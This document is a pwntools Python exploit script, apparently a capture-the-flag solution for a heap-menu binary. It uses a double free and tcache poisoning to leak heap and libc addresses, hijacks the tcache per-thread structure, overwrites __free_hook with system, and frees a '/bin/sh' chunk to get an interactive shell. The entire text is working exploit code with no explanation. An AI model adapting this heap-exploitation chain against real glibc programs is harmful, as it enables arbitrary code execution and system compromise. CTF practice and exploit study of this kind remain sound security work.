#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

context(arch='amd64', os='linux')

file_name = './pwn'
if args['G']:
	p = remote('127.0.0.1',10001)
else:
	p = process(file_name)
elf = ELF(file_name)
libc = elf.libc

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address, data      :log.success('%s:   ' % (address) + hex(data))

menu = b"Your choice: "

def add(size,content):
    sla(menu,b'1')
    sla(b'Size: ',str(size).encode())
    sla(b'Content: ',content)

def show(idx):
    sla(menu,b'3')
    sla('Index: ',str(idx))

def delete(idx):
    sla(menu,b'2')
    sla(b'Index: ',str(idx))

for i in range(9):
    add(0x68,b'aaaa')#0-8

for i in range(9):
    delete(i)
##leak heap_base
delete(7)
show(1)
ru(b'Content: ')
data = uu64(r(6))
lg('data',data)
heap = data - 0x260
lg('heap',heap)
##leak libc_base
for i in range(7):
    add(0x68,b'aaaa')#9-15
add(0x68,p64(heap+0x10))#16

add(0x68,b'aaaa')#17
add(0x68,b'aaaa')#18
payload = b'\x00'*0x23+b'\xff'
add(0x68,payload)#19
print('tcache_prethread_struct to unsortedbin')

delete(19)
show(19)
ru(b'Content: ')
data =  uu64(r(6))
lg('main_arena+96',data)
libc_base = data - 96 - (libc.sym['__malloc_hook'] + 0x10)
lg('libc_base',libc_base)

add(0xf8,b'\x00'*0x40+p64(libc_base+libc.sym['__free_hook']-8))#20
print('__free_hook to tcache_0x20')

add(0x18,b'/bin/sh\x00'+p64(libc_base+libc.sym['system']))#21
print('system')

delete(21)


itr()
